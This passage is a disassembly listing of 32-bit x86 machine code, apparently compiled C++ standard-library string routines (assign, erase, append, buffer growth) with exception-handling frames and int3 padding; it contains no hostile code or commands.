  403f96:	89 77 14             	mov    %esi,0x14(%edi)
  403f99:	89 4f 10             	mov    %ecx,0x10(%edi)
  403f9c:	83 fe 08             	cmp    $0x8,%esi
  403f9f:	72 02                	jb     0x403fa3
  403fa1:	8b fb                	mov    %ebx,%edi
  403fa3:	33 d2                	xor    %edx,%edx
  403fa5:	66 89 14 4f          	mov    %dx,(%edi,%ecx,2)
  403fa9:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  403fac:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  403fb3:	59                   	pop    %ecx
  403fb4:	5f                   	pop    %edi
  403fb5:	5e                   	pop    %esi
  403fb6:	5b                   	pop    %ebx
  403fb7:	8b e5                	mov    %ebp,%esp
  403fb9:	5d                   	pop    %ebp
  403fba:	c2 0c 00             	ret    $0xc
  403fbd:	8b 75 08             	mov    0x8(%ebp),%esi
  403fc0:	83 7e 14 08          	cmpl   $0x8,0x14(%esi)
  403fc4:	72 0b                	jb     0x403fd1
  403fc6:	8b 06                	mov    (%esi),%eax
  403fc8:	50                   	push   %eax
  403fc9:	e8 ff e4 00 00       	call   0x4124cd
  403fce:	83 c4 04             	add    $0x4,%esp
  403fd1:	33 c9                	xor    %ecx,%ecx
  403fd3:	51                   	push   %ecx
  403fd4:	c7 46 14 07 00 00 00 	movl   $0x7,0x14(%esi)
  403fdb:	c7 46 10 00 00 00 00 	movl   $0x0,0x10(%esi)
  403fe2:	51                   	push   %ecx
  403fe3:	66 89 0e             	mov    %cx,(%esi)
  403fe6:	e8 a6 fd 00 00       	call   0x413d91
  403feb:	cc                   	int3
  403fec:	cc                   	int3
  403fed:	cc                   	int3
  403fee:	cc                   	int3
  403fef:	cc                   	int3
  403ff0:	55                   	push   %ebp
  403ff1:	8b ec                	mov    %esp,%ebp
  403ff3:	56                   	push   %esi
  403ff4:	8b f1                	mov    %ecx,%esi
  403ff6:	8b 46 10             	mov    0x10(%esi),%eax
  403ff9:	8b 4d 08             	mov    0x8(%ebp),%ecx
  403ffc:	57                   	push   %edi
  403ffd:	3b c1                	cmp    %ecx,%eax
  403fff:	73 0a                	jae    0x40400b
  404001:	68 d0 93 42 00       	push   $0x4293d0
  404006:	e8 35 ef 01 00       	call   0x422f40
  40400b:	8b 7d 0c             	mov    0xc(%ebp),%edi
  40400e:	2b c1                	sub    %ecx,%eax
  404010:	3b c7                	cmp    %edi,%eax
  404012:	73 02                	jae    0x404016
  404014:	8b f8                	mov    %eax,%edi
  404016:	85 ff                	test   %edi,%edi
  404018:	74 50                	je     0x40406a
  40401a:	8b 56 14             	mov    0x14(%esi),%edx
  40401d:	53                   	push   %ebx
  40401e:	83 fa 10             	cmp    $0x10,%edx
  404021:	72 04                	jb     0x404027
  404023:	8b 1e                	mov    (%esi),%ebx
  404025:	eb 02                	jmp    0x404029
  404027:	8b de                	mov    %esi,%ebx
  404029:	83 fa 10             	cmp    $0x10,%edx
  40402c:	72 04                	jb     0x404032
  40402e:	8b 16                	mov    (%esi),%edx
  404030:	eb 02                	jmp    0x404034
  404032:	8b d6                	mov    %esi,%edx
  404034:	2b c7                	sub    %edi,%eax
  404036:	03 d9                	add    %ecx,%ebx
  404038:	50                   	push   %eax
  404039:	03 df                	add    %edi,%ebx
  40403b:	03 d1                	add    %ecx,%edx
  40403d:	53                   	push   %ebx
  40403e:	52                   	push   %edx
  40403f:	e8 9c e4 00 00       	call   0x4124e0
  404044:	8b 46 10             	mov    0x10(%esi),%eax
  404047:	83 c4 0c             	add    $0xc,%esp
  40404a:	2b c7                	sub    %edi,%eax
  40404c:	83 7e 14 10          	cmpl   $0x10,0x14(%esi)
  404050:	89 46 10             	mov    %eax,0x10(%esi)
  404053:	5b                   	pop    %ebx
  404054:	72 0e                	jb     0x404064
  404056:	8b 0e                	mov    (%esi),%ecx
  404058:	c6 04 01 00          	movb   $0x0,(%ecx,%eax,1)
  40405c:	5f                   	pop    %edi
  40405d:	8b c6                	mov    %esi,%eax
  40405f:	5e                   	pop    %esi
  404060:	5d                   	pop    %ebp
  404061:	c2 08 00             	ret    $0x8
  404064:	8b ce                	mov    %esi,%ecx
  404066:	c6 04 01 00          	movb   $0x0,(%ecx,%eax,1)
  40406a:	5f                   	pop    %edi
  40406b:	8b c6                	mov    %esi,%eax
  40406d:	5e                   	pop    %esi
  40406e:	5d                   	pop    %ebp
  40406f:	c2 08 00             	ret    $0x8
  404072:	cc                   	int3
  404073:	cc                   	int3
  404074:	cc                   	int3
  404075:	cc                   	int3
  404076:	cc                   	int3
  404077:	cc                   	int3
  404078:	cc                   	int3
  404079:	cc                   	int3
  40407a:	cc                   	int3
  40407b:	cc                   	int3
  40407c:	cc                   	int3
  40407d:	cc                   	int3
  40407e:	cc                   	int3
  40407f:	cc                   	int3
  404080:	55                   	push   %ebp
  404081:	8b ec                	mov    %esp,%ebp
  404083:	6a ff                	push   $0xffffffff
  404085:	68 30 3e 42 00       	push   $0x423e30
  40408a:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
  404090:	50                   	push   %eax
  404091:	83 ec 1c             	sub    $0x1c,%esp
  404094:	53                   	push   %ebx
  404095:	56                   	push   %esi
  404096:	57                   	push   %edi
  404097:	a1 bc d1 42 00       	mov    0x42d1bc,%eax
  40409c:	33 c5                	xor    %ebp,%eax
  40409e:	50                   	push   %eax
  40409f:	8d 45 f4             	lea    -0xc(%ebp),%eax
  4040a2:	64 a3 00 00 00 00    	mov    %eax,%fs:0x0
  4040a8:	89 65 f0             	mov    %esp,-0x10(%ebp)
  4040ab:	8b f9                	mov    %ecx,%edi
  4040ad:	89 7d ec             	mov    %edi,-0x14(%ebp)
  4040b0:	8b 45 08             	mov    0x8(%ebp),%eax
  4040b3:	8b f0                	mov    %eax,%esi
  4040b5:	83 ce 0f             	or     $0xf,%esi
  4040b8:	83 fe fe             	cmp    $0xfffffffe,%esi
  4040bb:	76 04                	jbe    0x4040c1
  4040bd:	8b f0                	mov    %eax,%esi
  4040bf:	eb 27                	jmp    0x4040e8
  4040c1:	8b 5f 14             	mov    0x14(%edi),%ebx
  4040c4:	b8 ab aa aa aa       	mov    $0xaaaaaaab,%eax
  4040c9:	f7 e6                	mul    %esi
  4040cb:	8b cb                	mov    %ebx,%ecx
  4040cd:	d1 e9                	shr    $1,%ecx
  4040cf:	d1 ea                	shr    $1,%edx
  4040d1:	3b ca                	cmp    %edx,%ecx
  4040d3:	76 13                	jbe    0x4040e8
  4040d5:	b8 fe ff ff ff       	mov    $0xfffffffe,%eax
  4040da:	2b c1                	sub    %ecx,%eax
  4040dc:	8d 34 19             	lea    (%ecx,%ebx,1),%esi
  4040df:	3b d8                	cmp    %eax,%ebx
  4040e1:	76 05                	jbe    0x4040e8
  4040e3:	be fe ff ff ff       	mov    $0xfffffffe,%esi
  4040e8:	33 c0                	xor    %eax,%eax
  4040ea:	8d 4e 01             	lea    0x1(%esi),%ecx
  4040ed:	89 45 fc             	mov    %eax,-0x4(%ebp)
  4040f0:	3b c8                	cmp    %eax,%ecx
  4040f2:	76 12                	jbe    0x404106
  4040f4:	83 f9 ff             	cmp    $0xffffffff,%ecx
  4040f7:	77 18                	ja     0x404111
  4040f9:	51                   	push   %ecx
  4040fa:	e8 28 e8 00 00       	call   0x412927
  4040ff:	83 c4 04             	add    $0x4,%esp
  404102:	85 c0                	test   %eax,%eax
  404104:	74 0b                	je     0x404111
  404106:	8b d8                	mov    %eax,%ebx
  404108:	c7 45 fc ff ff ff ff 	movl   $0xffffffff,-0x4(%ebp)
  40410f:	eb 5b                	jmp    0x40416c
  404111:	8d 4d e8             	lea    -0x18(%ebp),%ecx
  404114:	51                   	push   %ecx
  404115:	8d 4d d8             	lea    -0x28(%ebp),%ecx
  404118:	c7 45 e8 00 00 00 00 	movl   $0x0,-0x18(%ebp)
  40411f:	e8 29 e9 00 00       	call   0x412a4d
  404124:	68 4c b3 42 00       	push   $0x42b34c
  404129:	8d 55 d8             	lea    -0x28(%ebp),%edx
  40412c:	52                   	push   %edx
  40412d:	c7 45 d8 50 55 42 00 	movl   $0x425550,-0x28(%ebp)
  404134:	e8 58 fc 00 00       	call   0x413d91
  404139:	8b 45 08             	mov    0x8(%ebp),%eax
  40413c:	8b 4d ec             	mov    -0x14(%ebp),%ecx
  40413f:	89 45 08             	mov    %eax,0x8(%ebp)
  404142:	40                   	inc    %eax
  404143:	89 65 f0             	mov    %esp,-0x10(%ebp)
  404146:	50                   	push   %eax
  404147:	83 c1 18             	add    $0x18,%ecx
  40414a:	c6 45 fc 02          	movb   $0x2,-0x4(%ebp)
  40414e:	e8 fd 00 00 00       	call   0x404250
  404153:	89 45 e4             	mov    %eax,-0x1c(%ebp)
  404156:	c7 45 fc 01 00 00 00 	movl   $0x1,-0x4(%ebp)
  40415d:	b8 63 41 40 00       	mov    $0x404163,%eax
  404162:	c3                   	ret
  404163:	8b 7d ec             	mov    -0x14(%ebp),%edi
  404166:	8b 75 08             	mov    0x8(%ebp),%esi
  404169:	8b 5d e4             	mov    -0x1c(%ebp),%ebx
  40416c:	8b 4d 0c             	mov    0xc(%ebp),%ecx
  40416f:	85 c9                	test   %ecx,%ecx
  404171:	74 1a                	je     0x40418d
  404173:	83 7f 14 10          	cmpl   $0x10,0x14(%edi)
  404177:	72 04                	jb     0x40417d
  404179:	8b 07                	mov    (%edi),%eax
  40417b:	eb 02                	jmp    0x40417f
  40417d:	8b c7                	mov    %edi,%eax
  40417f:	51                   	push   %ecx
  404180:	50                   	push   %eax
  404181:	53                   	push   %ebx
  404182:	e8 a9 03 01 00       	call   0x414530
  404187:	8b 4d 0c             	mov    0xc(%ebp),%ecx
  40418a:	83 c4 0c             	add    $0xc,%esp
  40418d:	83 7f 14 10          	cmpl   $0x10,0x14(%edi)
  404191:	72 0e                	jb     0x4041a1
  404193:	8b 07                	mov    (%edi),%eax
  404195:	50                   	push   %eax
  404196:	e8 32 e3 00 00       	call   0x4124cd
  40419b:	8b 4d 0c             	mov    0xc(%ebp),%ecx
  40419e:	83 c4 04             	add    $0x4,%esp
  4041a1:	c6 07 00             	movb   $0x0,(%edi)
  4041a4:	89 1f                	mov    %ebx,(%edi)
  4041a6:	89 77 14             	mov    %esi,0x14(%edi)
  4041a9:	89 4f 10             	mov    %ecx,0x10(%edi)
  4041ac:	83 fe 10             	cmp    $0x10,%esi
  4041af:	72 02                	jb     0x4041b3
  4041b1:	8b fb                	mov    %ebx,%edi
  4041b3:	c6 04 0f 00          	movb   $0x0,(%edi,%ecx,1)
  4041b7:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  4041ba:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  4041c1:	59                   	pop    %ecx
  4041c2:	5f                   	pop    %edi
  4041c3:	5e                   	pop    %esi
  4041c4:	5b                   	pop    %ebx
  4041c5:	8b e5                	mov    %ebp,%esp
  4041c7:	5d                   	pop    %ebp
  4041c8:	c2 08 00             	ret    $0x8
  4041cb:	8b 75 ec             	mov    -0x14(%ebp),%esi
  4041ce:	83 7e 14 10          	cmpl   $0x10,0x14(%esi)
  4041d2:	72 0b                	jb     0x4041df
  4041d4:	8b 0e                	mov    (%esi),%ecx
  4041d6:	51                   	push   %ecx
  4041d7:	e8 f1 e2 00 00       	call   0x4124cd
  4041dc:	83 c4 04             	add    $0x4,%esp
  4041df:	6a 00                	push   $0x0
  4041e1:	c7 46 14 0f 00 00 00 	movl   $0xf,0x14(%esi)
  4041e8:	c7 46 10 00 00 00 00 	movl   $0x0,0x10(%esi)
  4041ef:	6a 00                	push   $0x0
  4041f1:	c6 06 00             	movb   $0x0,(%esi)
  4041f4:	e8 98 fb 00 00       	call   0x413d91
  4041f9:	cc                   	int3
  4041fa:	cc                   	int3
  4041fb:	cc                   	int3
  4041fc:	cc                   	int3
  4041fd:	cc                   	int3
  4041fe:	cc                   	int3
  4041ff:	cc                   	int3
  404200:	55                   	push   %ebp
  404201:	8b ec                	mov    %esp,%ebp
  404203:	83 ec 10             	sub    $0x10,%esp
  404206:	33 c0                	xor    %eax,%eax
  404208:	85 c9                	test   %ecx,%ecx
  40420a:	74 40                	je     0x40424c
  40420c:	81 f9 ff ff ff 7f    	cmp    $0x7fffffff,%ecx
  404212:	77 10                	ja     0x404224
  404214:	8d 04 09             	lea    (%ecx,%ecx,1),%eax
  404217:	50                   	push   %eax
  404218:	e8 0a e7 00 00       	call   0x412927
  40421d:	83 c4 04             	add    $0x4,%esp
  404220:	85 c0                	test   %eax,%eax
  404222:	75 28                	jne    0x40424c
  404224:	8d 4d fc             	lea    -0x4(%ebp),%ecx
  404227:	51                   	push   %ecx
  404228:	8d 4d f0             	lea    -0x10(%ebp),%ecx
  40422b:	c7 45 fc 00 00 00 00 	movl   $0x0,-0x4(%ebp)
  404232:	e8 16 e8 00 00       	call   0x412a4d
  404237:	68 4c b3 42 00       	push   $0x42b34c
  40423c:	8d 55 f0             	lea    -0x10(%ebp),%edx
  40423f:	52                   	push   %edx
  404240:	c7 45 f0 50 55 42 00 	movl   $0x425550,-0x10(%ebp)
  404247:	e8 45 fb 00 00       	call   0x413d91
  40424c:	8b e5                	mov    %ebp,%esp
  40424e:	5d                   	pop    %ebp
  40424f:	c3                   	ret
  404250:	55                   	push   %ebp
  404251:	8b ec                	mov    %esp,%ebp
  404253:	8b 4d 08             	mov    0x8(%ebp),%ecx
  404256:	83 ec 0c             	sub    $0xc,%esp
  404259:	33 c0                	xor    %eax,%eax
  40425b:	85 c9                	test   %ecx,%ecx
  40425d:	74 3a                	je     0x404299
  40425f:	83 f9 ff             	cmp    $0xffffffff,%ecx
  404262:	77 0d                	ja     0x404271
  404264:	51                   	push   %ecx
  404265:	e8 bd e6 00 00       	call   0x412927
  40426a:	83 c4 04             	add    $0x4,%esp
  40426d:	85 c0                	test   %eax,%eax
  40426f:	75 28                	jne    0x404299
  404271:	8d 45 08             	lea    0x8(%ebp),%eax
  404274:	50                   	push   %eax
  404275:	8d 4d f4             	lea    -0xc(%ebp),%ecx
  404278:	c7 45 08 00 00 00 00 	movl   $0x0,0x8(%ebp)
  40427f:	e8 c9 e7 00 00       	call   0x412a4d
  404284:	68 4c b3 42 00       	push   $0x42b34c
  404289:	8d 4d f4             	lea    -0xc(%ebp),%ecx
  40428c:	51                   	push   %ecx
  40428d:	c7 45 f4 50 55 42 00 	movl   $0x425550,-0xc(%ebp)
  404294:	e8 f8 fa 00 00       	call   0x413d91
  404299:	8b e5                	mov    %ebp,%esp
  40429b:	5d                   	pop    %ebp
  40429c:	c2 04 00             	ret    $0x4
  40429f:	cc                   	int3
  4042a0:	55                   	push   %ebp
  4042a1:	8b ec                	mov    %esp,%ebp
  4042a3:	6a ff                	push   $0xffffffff
  4042a5:	68 39 3f 42 00       	push   $0x423f39
  4042aa:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
  4042b0:	50                   	push   %eax
  4042b1:	51                   	push   %ecx
  4042b2:	56                   	push   %esi
  4042b3:	57                   	push   %edi
  4042b4:	a1 bc d1 42 00       	mov    0x42d1bc,%eax
  4042b9:	33 c5                	xor    %ebp,%eax
  4042bb:	50                   	push   %eax
  4042bc:	8d 45 f4             	lea    -0xc(%ebp),%eax
  4042bf:	64 a3 00 00 00 00    	mov    %eax,%fs:0x0
  4042c5:	8b 75 08             	mov    0x8(%ebp),%esi
  4042c8:	33 c0                	xor    %eax,%eax
  4042ca:	89 45 f0             	mov    %eax,-0x10(%ebp)
  4042cd:	c7 46 14 0f 00 00 00 	movl   $0xf,0x14(%esi)
  4042d4:	89 46 10             	mov    %eax,0x10(%esi)
  4042d7:	88 06                	mov    %al,(%esi)
  4042d9:	89 45 fc             	mov    %eax,-0x4(%ebp)
  4042dc:	8b 45 0c             	mov    0xc(%ebp),%eax
  4042df:	c7 45 f0 01 00 00 00 	movl   $0x1,-0x10(%ebp)
  4042e6:	8d 50 01             	lea    0x1(%eax),%edx
  4042e9:	8d a4 24 00 00 00 00 	lea    0x0(%esp),%esp
  4042f0:	8a 08                	mov    (%eax),%cl
  4042f2:	40                   	inc    %eax
  4042f3:	84 c9                	test   %cl,%cl
  4042f5:	75 f9                	jne    0x4042f0
  4042f7:	8b 7e 10             	mov    0x10(%esi),%edi
  4042fa:	2b c2                	sub    %edx,%eax
  4042fc:	03 43 10             	add    0x10(%ebx),%eax
  4042ff:	3b f8                	cmp    %eax,%edi
  404301:	77 26                	ja     0x404329
  404303:	39 46 14             	cmp    %eax,0x14(%esi)
  404306:	74 21                	je     0x404329
  404308:	6a 01                	push   $0x1
  40430a:	50                   	push   %eax
  40430b:	8b ce                	mov    %esi,%ecx
  40430d:	e8 fe f9 ff ff       	call   0x403d10
  404312:	84 c0                	test   %al,%al
  404314:	74 13                	je     0x404329
  404316:	83 7e 14 10          	cmpl   $0x10,0x14(%esi)
  40431a:	89 7e 10             	mov    %edi,0x10(%esi)
  40431d:	72 04                	jb     0x404323
  40431f:	8b 06                	mov    (%esi),%eax
  404321:	eb 02                	jmp    0x404325
  404323:	8b c6                	mov    %esi,%eax
  404325:	c6 04 38 00          	movb   $0x0,(%eax,%edi,1)
  404329:	8b 7d 0c             	mov    0xc(%ebp),%edi
  40432c:	8b c7                	mov    %edi,%eax
  40432e:	8d 50 01             	lea    0x1(%eax),%edx
  404331:	8a 08                	mov    (%eax),%cl
  404333:	40                   	inc    %eax
  404334:	84 c9                	test   %cl,%cl
  404336:	75 f9                	jne    0x404331
  404338:	2b c2                	sub    %edx,%eax
  40433a:	50                   	push   %eax
  40433b:	8b c7                	mov    %edi,%eax
  40433d:	8b ce                	mov    %esi,%ecx
  40433f:	e8 3c 01 00 00       	call   0x404480
  404344:	6a 00                	push   $0x0
  404346:	53                   	push   %ebx
  404347:	83 c8 ff             	or     $0xffffffff,%eax
  40434a:	e8 41 00 00 00       	call   0x404390
  40434f:	8b c6                	mov    %esi,%eax
  404351:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  404354:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  40435b:	59                   	pop    %ecx
  40435c:	5f                   	pop    %edi
  40435d:	5e                   	pop    %esi
  40435e:	8b e5                	mov    %ebp,%esp
  404360:	5d                   	pop    %ebp
  404361:	c3                   	ret
  404362:	cc                   	int3
  404363:	cc                   	int3
  404364:	cc                   	int3
  404365:	cc                   	int3
  404366:	cc                   	int3
  404367:	cc                   	int3
  404368:	cc                   	int3
  404369:	cc                   	int3
  40436a:	cc                   	int3
  40436b:	cc                   	int3
  40436c:	cc                   	int3
  40436d:	cc                   	int3
  40436e:	cc                   	int3
  40436f:	cc                   	int3
  404370:	55                   	push   %ebp
  404371:	8b ec                	mov    %esp,%ebp
  404373:	8b 45 08             	mov    0x8(%ebp),%eax
  404376:	56                   	push   %esi
  404377:	50                   	push   %eax
  404378:	8b f1                	mov    %ecx,%esi
  40437a:	e8 5c e7 00 00       	call   0x412adb
  40437f:	c7 06 50 55 42 00    	movl   $0x425550,(%esi)
  404385:	8b c6                	mov    %esi,%eax
  404387:	5e                   	pop    %esi
  404388:	5d                   	pop    %ebp
  404389:	c2 04 00             	ret    $0x4
  40438c:	cc                   	int3
  40438d:	cc                   	int3
  40438e:	cc                   	int3
  40438f:	cc                   	int3
  404390:	55                   	push   %ebp
  404391:	8b ec                	mov    %esp,%ebp
  404393:	8b 55 0c             	mov    0xc(%ebp),%edx
  404396:	53                   	push   %ebx
  404397:	8b d8                	mov    %eax,%ebx
  404399:	8b 45 08             	mov    0x8(%ebp),%eax
  40439c:	8b 40 10             	mov    0x10(%eax),%eax
  40439f:	3b c2                	cmp    %edx,%eax
  4043a1:	73 0a                	jae    0x4043ad
  4043a3:	68 d0 93 42 00       	push   $0x4293d0
  4043a8:	e8 93 eb 01 00       	call   0x422f40
  4043ad:	2b c2                	sub    %edx,%eax
  4043af:	3b c3                	cmp    %ebx,%eax
  4043b1:	73 02                	jae    0x4043b5
  4043b3:	8b d8                	mov    %eax,%ebx
  4043b5:	8b 46 10             	mov    0x10(%esi),%eax
  4043b8:	83 c9 ff             	or     $0xffffffff,%ecx
  4043bb:	2b c8                	sub    %eax,%ecx
  4043bd:	3b cb                	cmp    %ebx,%ecx
  4043bf:	77 0a                	ja     0x4043cb
  4043c1:	68 e8 93 42 00       	push   $0x4293e8
  4043c6:	e8 28 eb 01 00       	call   0x422ef3
  4043cb:	85 db                	test   %ebx,%ebx
  4043cd:	0f 84 98 00 00 00    	je     0x40446b
  4043d3:	57                   	push   %edi
  4043d4:	8d 3c 18             	lea    (%eax,%ebx,1),%edi
  4043d7:	83 ff fe             	cmp    $0xfffffffe,%edi
  4043da:	76 0a                	jbe    0x4043e6
  4043dc:	68 e8 93 42 00       	push   $0x4293e8
  4043e1:	e8 0d eb 01 00       	call   0x422ef3
  4043e6:	8b 4e 14             	mov    0x14(%esi),%ecx
  4043e9:	3b cf                	cmp    %edi,%ecx
  4043eb:	73 28                	jae    0x404415
  4043ed:	50                   	push   %eax
  4043ee:	57                   	push   %edi
  4043ef:	8b ce                	mov    %esi,%ecx
  4043f1:	e8 8a fc ff ff       	call   0x404080
  4043f6:	8b 55 0c             	mov    0xc(%ebp),%edx
  4043f9:	85 ff                	test   %edi,%edi
  4043fb:	74 6d                	je     0x40446a
  4043fd:	8b 4d 08             	mov    0x8(%ebp),%ecx
  404400:	b8 10 00 00 00       	mov    $0x10,%eax
  404405:	39 41 14             	cmp    %eax,0x14(%ecx)
  404408:	72 02                	jb     0x40440c
  40440a:	8b 09                	mov    (%ecx),%ecx
  40440c:	39 46 14             	cmp    %eax,0x14(%esi)
  40440f:	72 28                	jb     0x404439
  404411:	8b 06                	mov    (%esi),%eax
  404413:	eb 26                	jmp    0x40443b
  404415:	85 ff                	test   %edi,%edi
  404417:	75 e4                	jne    0x4043fd
  404419:	89 7e 10             	mov    %edi,0x10(%esi)
  40441c:	83 f9 10             	cmp    $0x10,%ecx
  40441f:	72 0d                	jb     0x40442e
  404421:	8b 06                	mov    (%esi),%eax
  404423:	5f                   	pop    %edi
  404424:	c6 00 00             	movb   $0x0,(%eax)
  404427:	8b c6                	mov    %esi,%eax
  404429:	5b                   	pop    %ebx
  40442a:	5d                   	pop    %ebp
  40442b:	c2 08 00             	ret    $0x8
  40442e:	8b c6                	mov    %esi,%eax
  404430:	5f                   	pop    %edi
  404431:	c6 00 00             	movb   $0x0,(%eax)
  404434:	5b                   	pop    %ebx
  404435:	5d                   	pop    %ebp
  404436:	c2 08 00             	ret    $0x8
  404439:	8b c6                	mov    %esi,%eax
  40443b:	03 ca                	add    %edx,%ecx
  40443d:	8b 56 10             	mov    0x10(%esi),%edx
  404440:	53                   	push   %ebx
  404441:	51                   	push   %ecx
  404442:	03 d0                	add    %eax,%edx
  404444:	52                   	push   %edx
  404445:	e8 e6 00 01 00       	call   0x414530
  40444a:	83 c4 0c             	add    $0xc,%esp
  40444d:	83 7e 14 10          	cmpl   $0x10,0x14(%esi)
  404451:	89 7e 10             	mov    %edi,0x10(%esi)
  404454:	72 0e                	jb     0x404464
  404456:	8b 06                	mov    (%esi),%eax
  404458:	c6 04 38 00          	movb   $0x0,(%eax,%edi,1)
  40445c:	5f                   	pop    %edi
  40445d:	8b c6                	mov    %esi,%eax
  40445f:	5b                   	pop    %ebx
  404460:	5d                   	pop    %ebp
  404461:	c2 08 00             	ret    $0x8
  404464:	8b c6                	mov    %esi,%eax
  404466:	c6 04 38 00          	movb   $0x0,(%eax,%edi,1)
  40446a:	5f                   	pop    %edi
  40446b:	8b c6                	mov    %esi,%eax
  40446d:	5b                   	pop    %ebx
  40446e:	5d                   	pop    %ebp
  40446f:	c2 08 00             	ret    $0x8
  404472:	cc                   	int3
  404473:	cc                   	int3
  404474:	cc                   	int3
  404475:	cc                   	int3
  404476:	cc                   	int3
  404477:	cc                   	int3
  404478:	cc                   	int3
  404479:	cc                   	int3
  40447a:	cc                   	int3
  40447b:	cc                   	int3
  40447c:	cc                   	int3
  40447d:	cc                   	int3
  40447e:	cc                   	int3
  40447f:	cc                   	int3
  404480:	55                   	push   %ebp
  404481:	8b ec                	mov    %esp,%ebp
  404483:	53                   	push   %ebx
  404484:	8b d8                	mov    %eax,%ebx
  404486:	56                   	push   %esi
  404487:	8b f1                	mov    %ecx,%esi
  404489:	85 db                	test   %ebx,%ebx
  40448b:	74 53                	je     0x4044e0
  40448d:	8b 4e 14             	mov    0x14(%esi),%ecx
  404490:	83 f9 10             	cmp    $0x10,%ecx
  404493:	72 04                	jb     0x404499
  404495:	8b 06                	mov    (%esi),%eax
  404497:	eb 02                	jmp    0x40449b
  404499:	8b c6                	mov    %esi,%eax
  40449b:	3b d8                	cmp    %eax,%ebx
  40449d:	72 41                	jb     0x4044e0
  40449f:	83 f9 10             	cmp    $0x10,%ecx
  4044a2:	72 04                	jb     0x4044a8
  4044a4:	8b 06                	mov    (%esi),%eax
  4044a6:	eb 02                	jmp    0x4044aa
  4044a8:	8b c6                	mov    %esi,%eax
  4044aa:	8b 56 10             	mov    0x10(%esi),%edx
  4044ad:	03 d0                	add    %eax,%edx
  4044af:	3b d3                	cmp    %ebx,%edx
  4044b1:	76 2d                	jbe    0x4044e0
  4044b3:	83 f9 10             	cmp    $0x10,%ecx
  4044b6:	72 14                	jb     0x4044cc
  4044b8:	8b 06                	mov    (%esi),%eax
  4044ba:	2b d8                	sub    %eax,%ebx
  4044bc:	8b 45 08             	mov    0x8(%ebp),%eax
  4044bf:	53                   	push   %ebx
  4044c0:	56                   	push   %esi
  4044c1:	e8 ca fe ff ff       	call   0x404390
  4044c6:	5e                   	pop    %esi
  4044c7:	5b                   	pop    %ebx
  4044c8:	5d                   	pop    %ebp
  4044c9:	c2 04 00             	ret    $0x4
  4044cc:	8b c6                	mov    %esi,%eax
  4044ce:	2b d8                	sub    %eax,%ebx
  4044d0:	8b 45 08             	mov    0x8(%ebp),%eax
  4044d3:	53                   	push   %ebx
  4044d4:	56                   	push   %esi
  4044d5:	e8 b6 fe ff ff       	call   0x404390
  4044da:	5e                   	pop    %esi
  4044db:	5b                   	pop    %ebx
  4044dc:	5d                   	pop    %ebp
  4044dd:	c2 04 00             	ret    $0x4
  4044e0:	8b 46 10             	mov    0x10(%esi),%eax
  4044e3:	8b 55 08             	mov    0x8(%ebp),%edx
  4044e6:	83 c9 ff             	or     $0xffffffff,%ecx
  4044e9:	2b c8                	sub    %eax,%ecx
  4044eb:	3b ca                	cmp    %edx,%ecx
  4044ed:	77 0a                	ja     0x4044f9
  4044ef:	68 e8 93 42 00       	push   $0x4293e8
  4044f4:	e8 fa e9 01 00       	call   0x422ef3
  4044f9:	85 d2                	test   %edx,%edx
  4044fb:	0f 84 8b 00 00 00    	je     0x40458c
  404501:	57                   	push   %edi
  404502:	8d 3c 10             	lea    (%eax,%edx,1),%edi
  404505:	83 ff fe             	cmp    $0xfffffffe,%edi
  404508:	76 0a                	jbe    0x404514
  40450a:	68 e8 93 42 00       	push   $0x4293e8
  40450f:	e8 df e9 01 00       	call   0x422ef3
  404514:	8b 4e 14             	mov    0x14(%esi),%ecx
  404517:	3b cf                	cmp    %edi,%ecx
  404519:	73 1a                	jae    0x404535
  40451b:	50                   	push   %eax
  40451c:	57                   	push   %edi
  40451d:	8b ce                	mov    %esi,%ecx
  40451f:	e8 5c fb ff ff       	call   0x404080
  404524:	8b 55 08             	mov    0x8(%ebp),%edx
  404527:	85 ff                	test   %edi,%edi
  404529:	74 60                	je     0x40458b
  40452b:	83 7e 14 10          	cmpl   $0x10,0x14(%esi)
  40452f:	72 2a                	jb     0x40455b
  404531:	8b 06                	mov    (%esi),%eax
  404533:	eb 28                	jmp    0x40455d
  404535:	85 ff                	test   %edi,%edi
  404537:	75 f2                	jne    0x40452b
  404539:	89 7e 10             	mov    %edi,0x10(%esi)
  40453c:	83 f9 10             	cmp    $0x10,%ecx
  40453f:	72 0e                	jb     0x40454f
  404541:	8b 06                	mov    (%esi),%eax
  404543:	5f                   	pop    %edi
  404544:	c6 00 00             	movb   $0x0,(%eax)
  404547:	8b c6                	mov    %esi,%eax
  404549:	5e                   	pop    %esi
  40454a:	5b                   	pop    %ebx
  40454b:	5d                   	pop    %ebp
  40454c:	c2 04 00             	ret    $0x4
  40454f:	5f                   	pop    %edi
  404550:	8b c6                	mov    %esi,%eax
  404552:	5e                   	pop    %esi
  404553:	c6 00 00             	movb   $0x0,(%eax)
  404556:	5b                   	pop    %ebx
  404557:	5d                   	pop    %ebp
  404558:	c2 04 00             	ret    $0x4
  40455b:	8b c6                	mov    %esi,%eax
  40455d:	52                   	push   %edx
  40455e:	8b 56 10             	mov    0x10(%esi),%edx
  404561:	03 d0                	add    %eax,%edx
  404563:	53                   	push   %ebx
  404564:	52                   	push   %edx
  404565:	e8 c6 ff 00 00       	call   0x414530
  40456a:	83 c4 0c             	add    $0xc,%esp
  40456d:	83 7e 14 10          	cmpl   $0x10,0x14(%esi)
  404571:	89 7e 10             	mov    %edi,0x10(%esi)
  404574:	72 0f                	jb     0x404585
  404576:	8b 06                	mov    (%esi),%eax
  404578:	c6 04 38 00          	movb   $0x0,(%eax,%edi,1)
  40457c:	5f                   	pop    %edi
  40457d:	8b c6                	mov    %esi,%eax
  40457f:	5e                   	pop    %esi
  404580:	5b                   	pop    %ebx
  404581:	5d                   	pop    %ebp
  404582:	c2 04 00             	ret    $0x4
  404585:	8b c6                	mov    %esi,%eax
  404587:	c6 04 38 00          	movb   $0x0,(%eax,%edi,1)
  40458b:	5f                   	pop    %edi
  40458c:	8b c6                	mov    %esi,%eax
  40458e:	5e                   	pop    %esi
  40458f:	5b                   	pop    %ebx
  404590:	5d                   	pop    %ebp
  404591:	c2 04 00             	ret    $0x4
  404594:	cc                   	int3
  404595:	cc                   	int3
  404596:	cc                   	int3
